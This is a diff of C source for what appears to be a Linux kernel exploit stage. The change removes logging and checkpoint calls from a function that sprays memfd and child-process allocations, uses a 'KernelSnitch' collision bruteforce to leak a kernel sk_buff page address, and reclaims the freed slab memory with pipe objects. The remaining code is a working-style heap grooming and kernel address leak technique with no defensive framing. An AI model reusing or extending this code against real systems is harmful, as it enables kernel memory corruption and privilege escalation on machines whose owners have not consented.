@@ -106,65 +106,39 @@ void free_pipe_object(int pipefd[2]) {
 }
 
 uintptr_t prepare_pipe_buffer_page_child(void) {
-  const char *supervisor_attempt = getenv("S23_SUPERVISOR_ATTEMPT");
-  int preparation_attempt = supervisor_attempt ? atoi(supervisor_attempt) : 1;
-  czg3_prep_begin("fops", preparation_attempt > 0 ? preparation_attempt : 1);
-  czg3_prep_phase_begin("preparation_context");
-  czg3_prep_phase_end("preparation_context", "ok", 1, PAGE_PAYLOAD_FOPS);
   struct mm_ctx prep;
   struct mm_ctx spray;
   struct mm_ctx pre;
   struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
 
-  czg3_prep_phase_begin("pipe_context_storage_init");
   init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
   init_ctx(&pre, objs_per_slab - 1);
   init_ctx(&post, objs_per_slab);
-  czg3_prep_phase_end("pipe_context_storage_init", "ok", prep.mm_cnt,
-                      spray.mm_cnt);
 
-  czg3_prep_phase_begin("pipe_initial_prep_allocations");
   for (size_t i = 0; i < prep.mm_cnt; i++) {
     prep.childs[i] = -1;
     prep.memfds[i] = clone_memfd();
   }
-  czg3_prep_phase_end("pipe_initial_prep_allocations", "ok", prep.mm_cnt,
-                      prep.mm_cnt);
-  czg3_prep_phase_begin("pipe_spray_allocations");
   for (size_t i = 0; i < spray.mm_cnt; i++) {
     spray.childs[i] = -1;
     spray.memfds[i] = clone_memfd();
   }
-  czg3_prep_phase_end("pipe_spray_allocations", "ok", spray.mm_cnt,
-                      spray.mm_cnt);
 
-  czg3_prep_phase_begin("pipe_kernelsnitch_setup");
   setup_kernelsnitch();
-  czg3_prep_phase_end("pipe_kernelsnitch_setup", "ok", 0, 0);
 
-  czg3_prep_phase_begin("pipe_pre_allocations");
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     pre.childs[i] = -1;
     pre.memfds[i] = clone_memfd();
   }
-  czg3_prep_phase_end("pipe_pre_allocations", "ok", pre.mm_cnt, pre.mm_cnt);
-  czg3_prep_phase_begin("pipe_leak_child_creation");
   pid_t leak_child = clone_leak_child();
-  czg3_prep_phase_end("pipe_leak_child_creation", "ok", leak_child, 0);
-  czg3_prep_phase_begin("pipe_post_allocations");
   for (size_t i = 0; i < post.mm_cnt; i++) {
     post.childs[i] = -1;
     post.memfds[i] = clone_memfd();
   }
-  czg3_prep_phase_end("pipe_post_allocations", "ok", post.mm_cnt,
-                      post.mm_cnt);
-  czg3_prep_phase_begin("pipe_leak_memfd_open");
   int leak_memfd = open_memfd(leak_child);
-  czg3_prep_phase_end("pipe_leak_memfd_open", "ok", leak_memfd, 0);
 
-  czg3_prep_phase_begin("pipe_free_pre_post_spray_children");
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
   }
@@ -174,24 +148,12 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   for (size_t i = 0; i < spray.mm_cnt; i++) {
     kill_child(spray.childs[i]);
   }
-  czg3_prep_phase_end("pipe_free_pre_post_spray_children", "ok",
-                      pre.mm_cnt + post.mm_cnt + spray.mm_cnt, 0);
-  czg3_prep_phase_begin("pipe_wait_leak_child");
   SYSCHK(waitpid(leak_child, NULL, 0));
-  czg3_prep_phase_end("pipe_wait_leak_child", "ok", leak_child, 0);
 
-  czg3_prep_phase_begin("pipe_collision_ready");
-  int collision_ready = kernelsnitch_collisions_ready();
-  czg3_prep_phase_end("pipe_collision_ready",
-                      collision_ready ? "ok" : "collision_not_ready",
-                      collision_ready, 0);
-  czg3_prep_checkpoint(collision_ready ? "pipe_collision_ready" :
-                                           "pipe_collision_failed");
-  if (!collision_ready) {
+  if (!kernelsnitch_collisions_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
   }
 
-  czg3_prep_phase_begin("pipe_socket_skb_preparation");
   unsigned char *buf = malloc(SKB_SEND_SIZE);
   memset(buf, 0x50, SKB_SEND_SIZE);
 
@@ -211,8 +173,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   msg.msg_iovlen = 1;
 
   SYSCHK(sendmsg(pcp_sv[0], &msg, 0));
-  czg3_prep_phase_end("pipe_socket_skb_preparation", "ok", SKB_SEND_SIZE, 1);
-  czg3_prep_phase_begin("pipe_cpu_pin_yield_partial_free");
   pin_to_core(CORE);
 
   sched_yield();
@@ -240,18 +200,9 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   sched_yield();
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
-  czg3_prep_phase_end("pipe_cpu_pin_yield_partial_free", "ok",
-                      pre.mm_cnt + post.mm_cnt, spray.mm_cnt / objs_per_slab);
 
-  czg3_prep_phase_begin("pipe_kernelsnitch_bruteforce");
   run_kernelsnitch_bruteforce();
-  czg3_prep_phase_end("pipe_kernelsnitch_bruteforce", "ok", 0, 0);
-  czg3_prep_checkpoint("pipe_bruteforce_complete");
-  czg3_prep_phase_begin("pipe_kernelsnitch_cleanup");
   uintptr_t leaked = cleanup_kernelsnitch();
-  czg3_prep_phase_end("pipe_kernelsnitch_cleanup",
-                      leaked == (uintptr_t)-1 ? "leak_failed" : "ok",
-                      leaked, 0);
   if (leaked == (uintptr_t)-1) {
     pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
     close_ctx_memfds(&prep);
@@ -263,7 +214,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     free_ctx_storage(&pre);
     free_ctx_storage(&post);
     free(buf);
-    czg3_prep_finish("pipe_leak_failed", leaked, 0, 0);
     return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
@@ -276,22 +226,17 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
 #endif
 
-  czg3_prep_phase_begin("pipe_drain_allocation");
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     alloc_pipe_object(pipe_fds_drain[i]);
   }
-  czg3_prep_phase_end("pipe_drain_allocation", "ok", PIPE_DRAIN, 0);
 
-  czg3_prep_phase_begin("pipe_reclaim_allocation");
   pin_to_core(CORE);
   SYSCHK(close(skb_sv[0]));
   SYSCHK(close(skb_sv[1]));
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     alloc_pipe_object(pipe_fds_reclaim[i]);
   }
-  czg3_prep_phase_end("pipe_reclaim_allocation", "ok", PIPE_RECLAIM, 0);
 
-  czg3_prep_phase_begin("pipe_cleanup");
   close_ctx_memfds(&prep);
   close_ctx_memfds(&spray);
   close_ctx_memfds(&pre);
@@ -301,9 +246,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   free_ctx_storage(&pre);
   free_ctx_storage(&post);
   free(buf);
-  czg3_prep_phase_end("pipe_cleanup", "ok", 0, 0);
-  czg3_prep_checkpoint("pipe_preparation_complete");
-  czg3_prep_finish("ok", leaked, base, (leaked - base) / MM_STRUCT_SZ);
   return base;
 }
 
